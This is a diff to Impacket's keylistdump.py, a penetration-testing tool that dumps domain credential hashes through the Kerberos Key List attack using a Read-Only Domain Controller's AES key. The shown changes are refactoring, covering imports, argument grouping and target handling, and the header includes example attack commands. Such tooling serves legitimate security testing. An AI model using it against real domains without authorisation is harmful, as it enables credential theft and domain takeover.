@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
+# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -19,32 +19,21 @@
 #       ./keylistdump.py contoso.com/jdoe:pass@dc01 -rodcNo 20000 -rodcKey <aesKey>
 #       ./keylistdump.py contoso.com/jdoe:pass@dc01 -rodcNo 20000 -rodcKey <aesKey> -full
 #       ./keylistdump.py -kdc dc01.contoso.com -t victim -rodcNo 20000 -rodcKey <aesKey> LIST
-#       ./keylistdump.py -domain contoso.com -kdc 192.0.0.1 -tf targetfile.txt -rodcNo 20000 -rodcKey <aesKey> LIST
+#       ./keylistdump.py -kdc dc01 -domain contoso.com -tf targetfile.txt -rodcNo 20000 -rodcKey <aesKey> LIST
 #
 # Author:
 #   Leandro Cuozzo (@0xdeaddood)
 #
 
-import datetime
 import logging
 import os
 import random
-import string
 
-from binascii import unhexlify
-from pyasn1.codec.der import encoder, decoder
-
-from impacket.dcerpc.v5 import samr, transport
 from impacket.examples import logger
 from impacket.examples.secretsdump import RemoteOperations, KeyListSecrets
 from impacket.examples.utils import parse_target
 from impacket.krb5 import constants
-from impacket.krb5.asn1 import Ticket as TicketAsn1, EncTicketPart, AP_REQ, seq_set, Authenticator, TGS_REQ, \
-    seq_set_iter, TGS_REP, EncTGSRepPart, KERB_KEY_LIST_REP
-from impacket.krb5.constants import ProtocolVersionNumber, TicketFlags, PrincipalNameType, encodeFlags, EncryptionTypes
-from impacket.krb5.crypto import Key, _enctype_table
-from impacket.krb5.kerberosv5 import sendReceive
-from impacket.krb5.types import KerberosTime, Principal, Ticket
+from impacket.krb5.types import Principal
 from impacket.smbconnection import SMBConnection
 from impacket import version
 
@@ -105,7 +94,7 @@ class KeyListDump:
             self.connect()
             self.__remoteOps = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
             self.__remoteOps.connectSamr(self.__domain)
-            self.__keyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__remoteOps)
+            self.__keyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, self.__remoteOps)
             logging.info('Enumerating target users. This may take a while on large domains')
             if self.__full is True:
                 targetList = self.getAllDomainUsers()
@@ -113,7 +102,7 @@ class KeyListDump:
                 targetList = self.__keyListSecrets.getAllowedUsersToReplicate()
         else:
             logging.info('Using target users provided by parameter')
-            self.__keyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, None)
+            self.__keyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, None)
             targetList = self.__targets
 
         logging.info('Dumping Domain Credentials (domain\\uid:[rid]:nthash)')
@@ -161,11 +150,13 @@ if __name__ == '__main__':
     parser.add_argument('-rodcKey', action='store', help='AES key of the Read Only Domain Controller')
     parser.add_argument('-full', action='store_true', default=False, help='Run the attack against all domain users. '
                         'Noisy! It could lead to more TGS requests being rejected')
-    parser.add_argument('-domain', action='store', help='Domain of the target user/s (only works with LIST)')
-    parser.add_argument('-kdc', action='store', help='KDC HostName or FQDN (only works with LIST)')
-    parser.add_argument('-t', action='store', help='Attack only the username specified (only works with LIST)')
-    parser.add_argument('-tf', action='store', help='File that contains a list of target usernames (only works with LIST)')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+
+    group = parser.add_argument_group('LIST option')
+    group.add_argument('-domain', action='store', help='The fully qualified domain name (only works with LIST)')
+    group.add_argument('-kdc', action='store', help='KDC HostName or FQDN (only works with LIST)')
+    group.add_argument('-t', action='store', help='Attack only the username specified (only works with LIST)')
+    group.add_argument('-tf', action='store', help='File that contains a list of target usernames (only works with LIST)')
 
     group = parser.add_argument_group('authentication')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='Use NTLM hashes to authenticate to SMB '
@@ -201,7 +192,6 @@ if __name__ == '__main__':
     if options.rodcNo is None:
         logging.error("You must specify the RODC number (krbtgt_XXXXX)")
         sys.exit(1)
-
     if options.rodcKey is None:
         logging.error("You must specify the RODC aes key")
         sys.exit(1)
@@ -209,11 +199,8 @@ if __name__ == '__main__':
     domain, username, password, remoteName = parse_target(options.target)
 
     if remoteName == '':
-        logging.error("You must specify the KDC hostname or IP")
+        logging.error("You must specify a target or set the option LIST")
         sys.exit(1)
-
-    if options.target_ip is None:
-        options.target_ip = remoteName
 
     if remoteName == 'LIST':
         targets = []
@@ -247,9 +234,10 @@ if __name__ == '__main__':
             logging.error("You must specify the KDC HostName or FQDN")
             sys.exit(1)
 
+        if options.target_ip is None:
+            options.target_ip = remoteName
         if options.domain is not None:
             domain = options.domain
-
         if domain == '':
             logging.error("You must specify a target domain. Use the flag -domain or define a FQDN in flag -kdc")
             sys.exit(1)
@@ -259,6 +247,8 @@ if __name__ == '__main__':
         if '@' not in options.target:
             logging.error("You must specify the KDC HostName or IP Address")
             sys.exit(1)
+        if options.target_ip is None:
+            options.target_ip = remoteName
         if domain == '':
             logging.error("You must specify a target domain")
             sys.exit(1)
